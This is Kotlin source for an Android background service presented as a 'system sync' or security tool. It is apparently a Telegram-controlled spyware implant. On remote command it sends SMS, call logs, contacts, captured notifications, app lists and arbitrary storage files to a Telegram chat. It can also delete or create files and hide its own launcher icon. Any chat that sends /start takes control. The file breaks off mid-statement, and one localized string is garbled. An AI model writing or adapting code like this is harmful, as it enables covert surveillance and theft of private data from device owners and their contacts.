package com.example.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.os.StatFs
import android.provider.Settings
import android.provider.CallLog
import android.provider.ContactsContract
import android.content.pm.PackageManager
import android.content.pm.ApplicationInfo
import androidx.core.app.NotificationCompat
import com.example.R
import com.example.SyncApplication
import com.example.data.TeleguardRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.TimeUnit

class SystemSyncService : Service() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private var botJob: Job? = null

    private lateinit var repository: TeleguardRepository
    private val okHttpClient = OkHttpClient.Builder()
        .connectTimeout(40, TimeUnit.SECONDS)
        .readTimeout(40, TimeUnit.SECONDS)
        .writeTimeout(40, TimeUnit.SECONDS)
        .build()

    private var serviceStartTime: Long = 0
    private var lastUpdateId = 0L
    private var activeLanguageCode: String = "en"

    private fun encodePathToShortId(path: String): String {
        val shortId = "p_" + path.hashCode().toString().replace("-", "n")
        try {
            val prefs = getSharedPreferences("raito_paths", Context.MODE_PRIVATE)
            prefs.edit().putString(shortId, path).apply()
        } catch (e: Exception) {
            // fallback
        }
        return shortId
    }

    private fun getPathFromParam(param: String): String {
        if (param == "p_root") return "/storage/emulated/0"
        return if (param.startsWith("p_")) {
            val prefs = getSharedPreferences("raito_paths", Context.MODE_PRIVATE)
            prefs.getString(param, null) ?: "/storage/emulated/0"
        } else {
            try {
                decodeHexToPath(param)
            } catch (e: Exception) {
                "/storage/emulated/0"
            }
        }
    }

    data class NotificationLogItem(
        val timestamp: String,
        val packageName: String,
        val title: String,
        val text: String
    )

    companion object {
        const val NOTIFICATION_ID = 93102
        const val CHANNEL_ID = "raito_channel"
        const val EXTRA_RESTART_BOT = "extra_restart_bot"

        fun startService(context: Context) {
            val intent = Intent(context, SystemSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stopService(context: Context) {
            val intent = Intent(context, SystemSyncService::class.java)
            context.stopService(intent)
        }
    }

    override fun onCreate() {
        super.onCreate()
        try {
            val app = applicationContext as? SyncApplication
            if (app != null) {
                repository = app.repository
            } else {
                val db = com.example.data.TeleguardDatabase.getInstance(applicationContext)
                repository = com.example.data.TeleguardRepository(db.teleguardDao)
            }
        } catch (e: Exception) {
            val db = com.example.data.TeleguardDatabase.getInstance(applicationContext)
            repository = com.example.data.TeleguardRepository(db.teleguardDao)
        }
        serviceStartTime = System.currentTimeMillis()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val forceRestart = intent?.getBooleanExtra(EXTRA_RESTART_BOT, false) ?: false

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                buildStatusNotification("RAITO Bot is Active", "Listening for alerts and Telegram remote commands."),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(
                NOTIFICATION_ID,
                buildStatusNotification("RAITO Bot is Active", "Listening for alerts and Telegram remote commands.")
            )
        }

        scope.launch {
            repository.log("INFO", "RAITO Foreground Service started.", "SUCCESS")
        }

        startBotPolling(forceRestart)

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startBotPolling(forceRestart: Boolean) {
        if (botJob?.isActive == true && !forceRestart) {
            return
        }
        botJob?.cancel()
        botJob = scope.launch(Dispatchers.IO) {
            var webhookClearedForToken: String? = null
            while (job.isActive) {
                val settings = repository.settings.first()
                if (!settings.isBotRunning) {
                    repository.log("INFO", "Raito Service stopped polling because daemon is disabled.", "INFO")
                    stopSelf()
                    break
                }
                activeLanguageCode = settings.languageCode
                val token = settings.botToken
                var chat = settings.chatId

                if (token.isEmpty() || token.isBlank()) {
                    repository.log("INFO", "Bot polling paused: Token is empty. Configure in Settings.", "INFO")
                    delay(8000)
                    continue
                }

                if (token != webhookClearedForToken) {
                    try {
                        val base = com.example.SyncApplication.getTelegramBaseUrl()
                        val deleteUrl = "$base$token/deleteWebhook"
                        val deleteReq = Request.Builder().url(deleteUrl).build()
                        okHttpClient.newCall(deleteReq).execute().use { res ->
                            if (res.isSuccessful) {
                                repository.log("BOT_STATUS", "Telegram Webhook auto-deleted to allow getUpdates polling.", "SUCCESS")
                                webhookClearedForToken = token
                            } else {
                                val err = res.body?.string() ?: ""
                                repository.log("BOT_STATUS", "Webhook clear result: ${res.code} $err", "INFO")
                            }
                        }
                    } catch (e: Exception) {
                        repository.log("BOT_STATUS", "Error clearing Telegram Webhook: ${e.message}", "FAILED")
                    }
                }

                try {
                    val offsetParam = if (lastUpdateId == 0L) -1L else lastUpdateId
                    val timeoutParam = if (lastUpdateId == 0L) 0 else 30
                    val base = com.example.SyncApplication.getTelegramBaseUrl()
                    val url = "$base$token/getUpdates?offset=$offsetParam&timeout=$timeoutParam"
                    val request = Request.Builder().url(url).build()

                    okHttpClient.newCall(request).execute().use { response ->
                        if (!response.isSuccessful) {
                            val errorBody = response.body?.string() ?: ""
                            repository.log("BOT_STATUS", "HTTP error polling updates: ${response.code} $errorBody", "FAILED")
                            delay(5000)
                            return@use
                        }

                        val bodyStr = response.body?.string() ?: ""
                        val rootJson = JSONObject(bodyStr)
                        if (rootJson.optBoolean("ok", false)) {
                            val resultAr = rootJson.optJSONArray("result") ?: JSONArray()
                            for (i in 0 until resultAr.length()) {
                                val item = resultAr.getJSONObject(i)
                                val updateId = item.optLong("update_id", 0L)
                                lastUpdateId = updateId + 1

                                try {
                                    val currentSettings = repository.settings.first()
                                    val currentToken = currentSettings.botToken
                                    var currentChat = currentSettings.chatId

                                    if (currentToken.isEmpty()) continue

                                    val callbackQuery = item.optJSONObject("callback_query")
                                    val messageObj = item.optJSONObject("message") ?: item.optJSONObject("edited_message")

                                    if (callbackQuery != null) {
                                        val queryId = callbackQuery.optString("id")
                                        val data = callbackQuery.optString("data")
                                        val cbMessage = callbackQuery.optJSONObject("message")
                                        val cbChat = cbMessage?.optJSONObject("chat")
                                        val cbChatId = cbChat?.optLong("id", 0L).toString()

                                        val isChatUnbound = currentChat.isEmpty() || currentChat.isBlank() || currentChat == "0" || currentChat.lowercase(Locale.getDefault()) == "null"

                                        if (isChatUnbound || cbChatId == currentChat.trim()) {
                                            answerCallbackQuery(currentToken, queryId)
                                            handleBotCommand(currentToken, cbChatId, data)
                                        } else {
                                            sendBotMessage(currentToken, cbChatId, "⚠️ *Access Denied.*\nThis RAITO service is linked to another owner device. Remote requests ignored.")
                                            repository.log("ALERT", "Blocked unauthorized Telegram callback query from Chat ID $cbChatId.", "FAILED")
                                        }
                                    } else if (messageObj != null) {
                                        val text = messageObj.optString("text", "").trim()
                                        val senderChat = messageObj.optJSONObject("chat")
                                        if (senderChat != null) {
                                            val senderChatId = senderChat.optLong("id", 0L).toString()
                                            val username = senderChat.optString("username", "User")
                                            val firstName = senderChat.optString("first_name", "")
                                            val cleanChat = currentChat.trim()
                                            val isStartCmd = text.lowercase(Locale.getDefault()).startsWith("/start") || 
                                                    text.lowercase(Locale.getDefault()) == "start" || 
                                                    text.lowercase(Locale.getDefault()) == "شروع" || 
                                                    text.lowercase(Locale.getDefault()) == "/شروع" || 
                                                    text.lowercase(Locale.getDefault()) == "shoroo" || 
                                                    text.lowercase(Locale.getDefault()) == "/shoroo"
                                            val isChatUnbound = cleanChat.isEmpty() || 
                                                    cleanChat == "0" || 
                                                    cleanChat.lowercase(Locale.getDefault()) == "null" ||
                                                    !cleanChat.matches(Regex("-?\\d+"))
                                            val isPersian = currentSettings.languageCode == "fa"

                                            if (isStartCmd) {
                                                currentChat = senderChatId
                                                val updatedSettings = currentSettings.copy(chatId = senderChatId)
                                                repository.saveSettings(updatedSettings)
                                                repository.log("INFO", "Dynamic link token associated Chat ID: $senderChatId", "SUCCESS")
                                                
                                                val welcomeText = if (isPersian) {
                                                    "🤖 *هسته امنیتی رایتو (RAITO) فعال شد*\n\nسلام $firstName (@$username). شناسه چت تلگرام شما با موفقیت به دستگاه متصل و ثبت شد.\n\nاز منوی شیشه‌ای و هوشمند زیر جهت پایش وضعیت دستگاه، دریافت برنامه‌ها و مانیتورینگ زنده استفاده کنید:"
                                                } else {
                                                    "🤖 *RAITO System Core Active*\n\nHello $firstName (@$username). Your device has successfully registered this Telegram Chat ID.\n\nUse the interactive inline glass control menu below to execute automated security actions and inspect logs remotely:"
                                                }
                                                sendBotMessage(currentToken, senderChatId, welcomeText, buildWelcomeKeyboard(currentSettings.languageCode))
                                            } else {
                                                if (isChatUnbound || senderChatId == cleanChat) {
                                                    handleBotCommand(currentToken, senderChatId, text)
                                                } else {
                                                    sendBotMessage(currentToken, senderChatId, "⚠️ *Access Denied.*\nThis RAITO service is linked to another owner device. Remote requests ignored.")
                                                    repository.log("ALERT", "Blocked unauthorized Telegram command from Chat ID $senderChatId (@$username).", "FAILED")
                                                }
                                            }
                                        }
                                    }
                                } catch (inner: Exception) {
                                    repository.log("BOT_STATUS", "Error processing telegram update item: ${inner.message}", "FAILED")
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    repository.log("BOT_STATUS", "Connection exception during polling: ${e.message}", "FAILED")
                    delay(6000)
                }

                delay(1000)
            }
        }
    }

    private suspend fun handleBotCommand(token: String, chat: String, text: String) {
        val settings = repository.settings.first()
        val langCode = settings.languageCode
        val isPersian = langCode == "fa"
        repository.log("BOT_COMMAND", "Received remote command: $text", "SUCCESS")
        val cleanCmd = text.substringBefore("@").trim()
        when {
            cleanCmd.startsWith("/start") || cleanCmd.startsWith("/help") || cleanCmd == "cmd_main_menu" -> {
                val helpMsg = if (isPersian) {
                    "🤖 *هسته امنیتی رایتو (RAITO) فعال است*\n\nبه پنل کنترل از راه دور پیشرفته رایتو خوش آمدید. از منوی شیشه‌ای و هوشمند زیر جهت اجرای دستورات امنیتی استفاده نمایید:"
                } else {
                    "🤖 *RAITO System Core Active*\n\nWelcome to the advanced RAITO device controller console. Use the interactive inline glass control menu below to execute automated security actions and inspect logs remotely:"
                }
                sendBotMessage(token, chat, helpMsg, buildWelcomeKeyboard(langCode))
            }
            cleanCmd.startsWith("/clean") || cleanCmd == "cmd_clean" -> {
                val result = performCacheClean()
                val totalStr = formatSize(getStorageCapacity(false))
                val freeStr = formatSize(getStorageCapacity(true))
                val reply = "🧹 *Storage Maintenance Done!*\n\n" +
                        "• App temporary files discarded.\n" +
                        "• Cleared Cache: *${formatSize(result)}*\n" +
                        "• Available Drive Storage: `$freeStr / $totalStr`"
                sendBotMessage(token, chat, reply, buildWelcomeKeyboard())
            }
            cleanCmd.startsWith("/clear_logs") || cleanCmd == "cmd_clear_logs" -> {
                repository.clearLogs()
                sendBotMessage(token, chat, "🗑️ *Operational Logs Console Purged Remotely* via Telegram control.", buildWelcomeKeyboard())
            }
            cleanCmd.startsWith("/time") -> {
                val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                val deviceTime = sdf.format(Date())
                val tzName = TimeZone.getDefault().displayName
                val tzId = TimeZone.getDefault().id

                // Launch time setup link notification
                triggerTimeSetupNotification()

                val reply = "⏰ *Device System Time Stats*\n\n" +
                        "• Device Date/Time: `$deviceTime`\n" +
                        "• Timezone: `$tzName` (`$tzId`)\n\n" +
                        "🔔 *Action Triggered:* A systems notification has been pushed to the Android phone to navigate users immediately to Time Settings."
                sendBotMessage(token, chat, reply, buildWelcomeKeyboard())
            }
            cleanCmd == "/status" || cleanCmd == "cmd_status" || cleanCmd == "cmd_device_check" -> {
                val batteryPct = getBatteryPercentage()
                val batteryStatus = getBatteryStatus()
                val totalStr = formatSize(getStorageCapacity(false))
                val freeStr = formatSize(getStorageCapacity(true))
                val connType = getNetworkType()
                val uptimeSec = (System.currentTimeMillis() - serviceStartTime) / 1000
                val uptimeStr = formatDuration(uptimeSec)
                val appLang = settings.languageCode.uppercase()

                val reply = "📊 *RAITO Status Metrics*\n\n" +
                        "🔋 *Battery Unit:* `$batteryPct%` ($batteryStatus)\n" +
                        "💾 *Local Storage:* `$freeStr Free / $totalStr Total`\n" +
                        "🌐 *Internet Profile:* `$connType`\n" +
                        "⏱️ *Bot Uptime:* `$uptimeStr`\n" +
                        "🗺️ *App Language:* `$appLang`"
                sendBotMessage(token, chat, reply, buildWelcomeKeyboard())
            }
            cleanCmd == "/logs" || cleanCmd == "cmd_local_logs" -> {
                val logsList = repository.allLogs.first().take(10)
                if (logsList.isEmpty()) {
                    sendBotMessage(token, chat, "📂 *Diagnostics Log Console:*\n\n`No logs recorded yet.`", buildWelcomeKeyboard())
                } else {
                    val sb = StringBuilder("📂 *Diagnostics Log Console (Latest 10):*\n\n")
                    logsList.forEach { log ->
                        val sdf = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                        val timeStr = sdf.format(Date(log.timestamp))
                        val statusEmoji = when (log.status) {
                            "SUCCESS" -> "🟢"
                            "FAILED" -> "🔴"
                            else -> "ℹ️"
                        }
                        sb.append("$statusEmoji `$timeStr` [${log.type}] ${log.message}\n")
                    }
                    
                    val isFa = activeLanguageCode == "fa"
                    val kb = JSONObject().apply {
                        val array = JSONArray().apply {
                            val r1 = JSONArray().apply {
                                put(JSONObject().apply {
                                    put("text", if (isFa) "📥 دانلود فایل لاگ (.txt)" else "📥 Download All Logs (.txt)")
                                    put("callback_data", "cmd_dl_db_logs")
                                })
                            }
                            put(r1)
                            val r2 = JSONArray().apply {
                                put(JSONObject().apply {
                                    put("text", if (isFa) "🔙 منوی اصلی" else "🔙 Main Menu")
                                    put("callback_data", "cmd_main_menu")
                                })
                            }
                            put(r2)
                        }
                        put("inline_keyboard", array)
                    }
                    sendBotMessage(token, chat, sb.toString(), kb)
                }
            }
            cleanCmd == "/apps" || cleanCmd == "cmd_apps" || cleanCmd == "cmd_installed_packages" || cleanCmd.startsWith("cmd_apps_page_") || cleanCmd.startsWith("/apps_page_") -> {
                val page = cleanCmd.removePrefix("cmd_apps_page_").removePrefix("/apps_page_").removePrefix("cmd_installed_packages").removePrefix("/apps").removePrefix("cmd_apps").toIntOrNull() ?: 0
                val (appsResult, kb) = fetchInstalledAppsPaginated(page)
                sendBotMessage(token, chat, appsResult, kb)
            }
            cleanCmd == "/config" || cleanCmd == "cmd_config" || cleanCmd == "cmd_system_config" -> {
                val isDark = settings.isDarkTheme
                val lang = settings.languageCode.uppercase()
                val isRunning = settings.isBotRunning
                val textMsg = "⚙️ *RAITO System Configuration*\n\n" +
                           "• *Visual Mode:* ${if (isDark) "🖤 Dark Theme" else "🤍 Light Theme"}\n" +
                           "• *Language:* `$lang`\n" +
                           "• *Daemon Active:* ${if (isRunning) "🟢 Yes" else "🔴 No"}\n" +
                           "• *Admin Chat ID:* `${settings.chatId}`\n\n" +
                           "System diagnostics loop running normally in background."
                sendBotMessage(token, chat, textMsg, buildWelcomeKeyboard())
            }
            cleanCmd == "/network" || cleanCmd == "cmd_network" -> {
                val connType = getNetworkType()
                val isOnline = connType != "Offline"
                val reply = "🌐 *RAITO Network Connectivity Status*\n\n" +
                        "• *Internet Connection:* ${if (isOnline) "🟢 Online / Active" else "🔴 Offline"}\n" +
                        "• *Active Interface Type:* `$connType`"
                sendBotMessage(token, chat, reply, buildWelcomeKeyboard())
            }
            cleanCmd == "/sms" || cleanCmd == "cmd_sms" || cleanCmd.startsWith("cmd_sms_page_") || cleanCmd.startsWith("/sms_page_") -> {
                val page = cleanCmd.removePrefix("cmd_sms_page_").removePrefix("/sms_page_").removePrefix("cmd_sms").removePrefix("/sms").toIntOrNull() ?: 0
                val (smsResult, kb) = fetchSmsInboxPaginated(page)
                sendBotMessage(token, chat, smsResult, kb)
            }
            cleanCmd == "/notif" || cleanCmd == "cmd_notif_reports" || cleanCmd.startsWith("cmd_notifs_page_") || cleanCmd.startsWith("/notif_reports") -> {
                var page = 0
                var filter: String? = null
                
                val cleanKey = cleanCmd.replace("cmd_notifs_page_", "").replace("/notif_reports", "").replace("/notif", "")
                if (cleanKey.isNotEmpty()) {
                    if (cleanKey.contains("_f_")) {
                        val pageStr = cleanKey.substringBefore("_f_")
                        page = pageStr.toIntOrNull() ?: 0
                        filter = cleanKey.substringAfter("_f_").trim()
                    } else {
                        page = cleanKey.toIntOrNull() ?: 0
                    }
                }
                
                val (notifResult, kb) = fetchNotificationsPaginated(page, filter)
                sendBotMessage(token, chat, notifResult, kb)
            }
            cleanCmd.startsWith("/get_logs") -> {
                val parts = text.split(" ")
                val filter = if (parts.size >= 2) parts[1].trim() else null
                val file = generateFilteredLogFile(filter)
                sendFileToUser(token, chat, file.absolutePath)
            }
            cleanCmd == "cmd_dl_logs_all" -> {
                val file = generateFilteredLogFile(null)
                sendFileToUser(token, chat, file.absolutePath)
            }
            cleanCmd == "cmd_dl_db_logs" -> {
                scope.launch(Dispatchers.IO) {
                    try {
                        val logsList = repository.allLogs.first()
                        val file = File(applicationContext.getExternalFilesDir(null), "raito_system_logs.txt")
                        val sb = java.lang.StringBuilder()
                        sb.append("--- RAITO SYSTEM DIAGNOSTICS LOG HISTORY ---\n")
                        sb.append("Generated on: ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())}\n\n")
                        logsList.forEach { log ->
                            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                            val dateStr = sdf.format(Date(log.timestamp))
                            sb.append("[$dateStr] [${log.type}] [${log.status}] ${log.message}\n")
                        }
                        file.writeText(sb.toString())
                        sendFileToUser(token, chat, file.absolutePath)
                    } catch (e: Exception) {
                        sendBotMessage(token, chat, "❌ Error generating logs file: ${e.message}")
                    }
                }
            }
            cleanCmd == "cmd_dl_logs_telegram" -> {
                val file = generateFilteredLogFile("telegram")
                sendFileToUser(token, chat, file.absolutePath)
            }
            cleanCmd == "cmd_dl_logs_whatsapp" -> {
                val file = generateFilteredLogFile("whatsapp")
                sendFileToUser(token, chat, file.absolutePath)
            }
            cleanCmd == "/calls" || cleanCmd == "cmd_calls" || cleanCmd.startsWith("cmd_calls_page_") || cleanCmd.startsWith("/calls_page_") -> {
                val page = cleanCmd.removePrefix("cmd_calls_page_").removePrefix("/calls_page_").removePrefix("cmd_calls").removePrefix("/calls").toIntOrNull() ?: 0
                val (callsResult, kb) = fetchCallLogsPaginated(page)
                sendBotMessage(token, chat, callsResult, kb)
            }
            cleanCmd == "/contacts" || cleanCmd == "cmd_contacts" -> {
                val contactsResult = fetchContacts()
                sendBotMessage(token, chat, contactsResult, buildWelcomeKeyboard())
            }
            cleanCmd == "/files" || cleanCmd == "cmd_files" -> {
                val (fileResult, kb) = fetchFilesAndFoldersPaginated(null, 0)
                sendBotMessage(token, chat, fileResult, kb)
            }
            cleanCmd.startsWith("cmd_files_dir_") || cleanCmd.startsWith("/files_dir_") -> {
                val details = if (cleanCmd.startsWith("cmd_files_dir_")) {
                    cleanCmd.removePrefix("cmd_files_dir_")
                } else {
                    cleanCmd.removePrefix("/files_dir_")
                }
                
                var param = details
                var page = 0
                if (details.contains("_p_")) {
                    param = details.substringBefore("_p_")
                    page = details.substringAfter("_p_").toIntOrNull() ?: 0
                }
                
                try {
                    val decodedPath = getPathFromParam(param)
                    val (fileOutput, kb) = fetchFilesAndFoldersPaginated(decodedPath, page)
                    sendBotMessage(token, chat, fileOutput, kb)
                } catch (e: Exception) {
                    sendBotMessage(token, chat, "❌ Error parsing path: ${e.message}", buildWelcomeKeyboard())
                }
            }
            cleanCmd.startsWith("cmd_file_sel_") -> {
                val param = cleanCmd.removePrefix("cmd_file_sel_")
                try {
                    val isFa = activeLanguageCode == "fa"
                    val decodedPath = getPathFromParam(param)
                    val file = File(decodedPath)
                    val sizeStr = formatSize(file.length())
                    val parentFolder = file.parentFile?.absolutePath ?: "/storage/emulated/0"
                    val parentShortId = encodePathToShortId(parentFolder)
                    val emoji = getFileEmoji(file)
                    
                    val textMsg = if (isFa) {
                        "$emoji <b>جزئیات فایل:</b> <code>${file.name}</code>\n" +
                        "📍 <b>مسیر کامل:</b> <code>${file.absolutePath}</code>\n" +
                        "📦 <b>حجم فایل:</b> <code>$sizeStr</code>\n\n" +
                        "یک عملیات را برای این فایل انتخاب کنید:"
                    } else {
                        "$emoji <b>File Selected:</b> <code>${file.name}</code>\n" +
                        "📍 <b>Absolute Path:</b> <code>${file.absolutePath}</code>\n" +
                        "📦 <b>File Size:</b> <code>$sizeStr</code>\n\n" +
                        "Choose a standard action for this file:"
                    }
                    
                    val kb = JSONObject().apply {
                        val array = JSONArray().apply {
                            val r1 = JSONArray().apply {
                                put(JSONObject().apply {
                                    put("text", if (isFa) "🔍 نمایش محتوا (TXT)" else "🔍 View Content (TXT)")
                                    put("callback_data", "cmd_file_view_$param")
                                })
                                put(JSONObject().apply {
                                    put("text", if (isFa) "📥 دریافت فایل" else "📥 Download File")
                                    put("callback_data", "cmd_file_send_$param")
                                })
                            }
                            put(r1)
                            
                            val r2 = JSONArray().apply {
                                put(JSONObject().apply {
                                    put("text", if (isFa) "🗑️ حذف ایمن فایل" else "🗑️ Delete File")
                                    put("callback_data", "cmd_file_del_$param")
                                })
                                put(JSONObject().apply {
                                    put("text", if (isFa) "⬅️ بازگشت به پوشه" else "⬅️ Back to folder")
                                    put("callback_data", "cmd_files_dir_$parentShortId")
                                })
                            }
                            put(r2)
                        }
                        put("inline_keyboard", array)
                    }
                    sendBotMessage(token, chat, textMsg, kb)
                } catch (e: Exception) {
                    sendBotMessage(token, chat, "❌ Error: ${e.message}", buildWelcomeKeyboard())
                }
            }
            cleanCmd.startsWith("/file_view_") || cleanCmd.startsWith("cmd_file_view_") -> {
                val prefix = if (cleanCmd.startsWith("/file_view_")) "/file_view_" else "cmd_file_view_"
                val hex = cleanCmd.removePrefix(prefix)
                try {
                    val decodedPath = getPathFromParam(hex)
                    val viewOutput = viewFileContent(decodedPath)
                    
                    val isFa = activeLanguageCode == "fa"
                    val file = File(decodedPath)
                    val parentFolder = file.parentFile?.absolutePath ?: "/storage/emulated/0"
                    val parentShortId = encodePathToShortId(parentFolder)
                    val kb = JSONObject().apply {
                        val array = JSONArray().apply {
                            put(JSONArray().apply {
                                put(JSONObject().apply {
                                    put("text", if (isFa) "⬅️ بازگشت" else "⬅️ Back")
                                    put("callback_data", "cmd_file_sel_$hex")
                                })
                                put(JSONObject().apply {
                                    put("text", if (isFa) "📁 کل پوشه" else "📁 Folder View")
                                    put("callback_data", "cmd_files_dir_$parentShortId")
                                })
                            })
                        }
                        put("inline_keyboard", array)
                    }
                    sendBotMessage(token, chat, viewOutput, kb)
                } catch (e: Exception) {
                    sendBotMessage(token, chat, "❌ Error parsing file path: ${e.message}", buildWelcomeKeyboard())
                }
            }
            cleanCmd.startsWith("/file_send_") || cleanCmd.startsWith("cmd_file_send_") -> {
                val prefix = if (cleanCmd.startsWith("/file_send_")) "/file_send_" else "cmd_file_send_"
                val hex = cleanCmd.removePrefix(prefix)
                try {
                    val decodedPath = getPathFromParam(hex)
                    sendFileToUser(token, chat, decodedPath)
                } catch (e: Exception) {
                    sendBotMessage(token, chat, "❌ Error parsing target path: ${e.message}", buildWelcomeKeyboard())
                }
            }
            cleanCmd.startsWith("/file_delete_") || cleanCmd.startsWith("cmd_file_del_") -> {
                val prefix = if (cleanCmd.startsWith("/file_delete_")) "/file_delete_" else "cmd_file_del_"
                val hex = cleanCmd.removePrefix(prefix)
                try {
                    val decodedPath = getPathFromParam(hex)
                    val deleteResult = performDeleteFileOrFolder(decodedPath)
                    sendBotMessage(token, chat, deleteResult, buildWelcomeKeyboard())
                } catch (e: Exception) {
                    sendBotMessage(token, chat, "❌ Error decoding path: ${e.message}", buildWelcomeKeyboard())
                }
            }
            cleanCmd.startsWith("cmd_mkdir_") || cleanCmd.startsWith("/mkdir_") -> {
                val cmdPrefix = if (cleanCmd.startsWith("cmd_mkdir_")) "cmd_mkdir_" else "/mkdir_"
                val remainder = cleanCmd.removePrefix(cmdPrefix)
                val hex = remainder.substringBefore(" ")
                val rightArgs = text.substringAfter(" ", "").trim()

                if (rightArgs.isEmpty()) {
                    val helpMsg = "✍️ <b>Instruction to create folder:</b>\n\n" +
                            "Please copy & paste the template format and replace <code>NewFolder</code> with your desired folder name:\n\n" +
                            "<code>/mkdir_${hex} NewFolder</code>"
                    sendBotMessage(token, chat, helpMsg, buildWelcomeKeyboard())
                } else {
                    try {
                        val parentPath = getPathFromParam(hex)
                        val parentFile = File(parentPath)
                        val newDir = File(parentFile, rightArgs)
                        val success = newDir.mkdirs()
                        if (success) {
                            sendBotMessage(token, chat, "✅ <b>Directory Created Successfully!</b>\n\n• Name: <code>$rightArgs</code>\n• Directory: <code>${parentFile.name}</code>", buildWelcomeKeyboard())
                        } else {
                            sendBotMessage(token, chat, "❌ <b>Failed to create folder.</b> Permissions denied or already exists.", buildWelcomeKeyboard())
                        }
                    } catch (e: Exception) {
                        sendBotMessage(token, chat, "❌ <b>Error creating folder:</b> ${e.message}", buildWelcomeKeyboard())
                    }
                }
            }
            cleanCmd.startsWith("cmd_mkfile_") || cleanCmd.startsWith("/mkfile_") -> {
                val cmdPrefix = if (cleanCmd.startsWith("cmd_mkfile_")) "cmd_mkfile_" else "/mkfile_"
                val remainder = cleanCmd.removePrefix(cmdPrefix)
                val hex = remainder.substringBefore(" ")
                val rightArgs = text.substringAfter(" ", "").trim()
                
                val fileName = rightArgs.substringBefore(" ").trim()
                val fileContent = rightArgs.substringAfter(" ", "").trim()

                if (fileName.isEmpty()) {
                    val helpMsg = "✍️ <b>Instruction to create file:</b>\n\n" +
                            "Please copy & paste the template format and replace details:\n\n" +
                            "<code>/mkfile_${hex} MyFile.txt Your content goes here!</code>"
                    sendBotMessage(token, chat, helpMsg, buildWelcomeKeyboard())
                } else {
                    try {
                        val parentPath = getPathFromParam(hex)
                        val parentFile = File(parentPath)
                        val newFile = File(parentFile, fileName)
                        val finalContent = if (fileContent.isEmpty()) "Empty RAITO text file." else fileContent
                        newFile.writeText(finalContent, Charsets.UTF_8)
                        sendBotMessage(token, chat, "✅ <b>File Created Successfully!</b>\n\n• Name: <code>$fileName</code>\n• Size: <code>${newFile.length()} bytes</code>", buildWelcomeKeyboard())
                    } catch (e: Exception) {
                        sendBotMessage(token, chat, "❌ <b>Error creating file:</b> ${e.message}", buildWelcomeKeyboard())
                    }
                }
            }
            cleanCmd == "cmd_show_app" || cleanCmd == "/show_app" -> {
                com.example.utils.AppHider.setAppIconVisible(this, true)
                sendBotMessage(token, chat, "🟢 *آیکون برنامه با موفقیت نمایان شد!* / *Launcher Icon Restored!*\n\nThe app launcher icon is now visible in your device's app drawer again.", buildWelcomeKeyboard())
            }
            cleanCmd == "cmd_hide_app" || cleanCmd == "/hide_app" -> {
                com.example.utils.AppHider.setAppIconVisible(this, false)
                sendBotMessage(token, chat, "🕶️ *رایتو با موفقیت مخفی شد!* / *App Hidden in Stealth Mode!*\n\nThe launcher icon is now hidden. Send `/show_app` to reveal it again anytime.", buildWelcomeKeyboard())
            }
            cleanCmd == "cmd_hide_reveal_menu" || cleanCmd == "/hide_reveal_menu" -> {
                val isVisible = com.example.utils.AppHider.isAppIconVisible(this)
                val isFa = langCode == "fa"
                val textMsg = if (isFa) {
                    "🕶️ *تنظیمات تعاملی مخفی‌سازی رایتو*\n\n" +
                    "وضعیت کنونی آیکون برنامه: ${if (isVisible) "🟢 نمایان (Visible)" else "🔴 مخفی (Hidden)"}\n\n" +
                    "با کلیک بر روی دکمه‌های زیر می‌توانید آیکون برنامه را درون گوشی مخفی یا مجدداً نمایان نمایید:"
                } else {
                    "🕶️ *RAITO Stealth Mode Controls*\n\n" +
                    "Current launcher state: ${if (isVisible) "🟢 Visible" else "🔴 Hidden (Stealth)"}\n\n" +
                    "Choose an action below to toggle visibility in the app drawer:"
                }
                
                val hideRevealKb = JSONArray().apply {
                    put(JSONArray().apply {
                        put(JSONObject().apply { put("text", if (isFa) "🕶️ مخفی‌ کردن آیکون" else "🕶️ Hide App Icon"); put("callback_data", "cmd_hide_app") })
                        put(JSONObject().apply { put("text", if (isFa) "✨ نمایان‌ کردن آیکون" else "✨ Show App Icon"); put("callback_data", "cmd_show_app") })
                    })
                    put(JSONArray().apply {
                        put(JSONObject().apply { put("text", if (isFa) "🔙 منوی اصلی" else "🔙 Main Menu"); put("callback_data", "cmd_main_menu") })
                    })
                }
                sendBotMessage(token, chat, textMsg, JSONObject().apply { put("inline_keyboard", hideRevealKb) })
            }
            cleanCmd == "cmd_lang_menu" || cleanCmd == "/lang_menu" -> {
                val msg = when (langCode) {
                    "fa" -> "🌐 لطفا زبان ربات و برنامه را انتخاب کنید:"
                    "ru" -> "🌐 Выберите язык для бота и приложения:"
                    "zh" -> "🌐 请选择机器人和应用程序ের语言:"
                    else -> "🌐 Please select the language for the bot and app:"
                }
                sendBotMessage(token, chat, msg, buildLanguageKeyboard())
            }
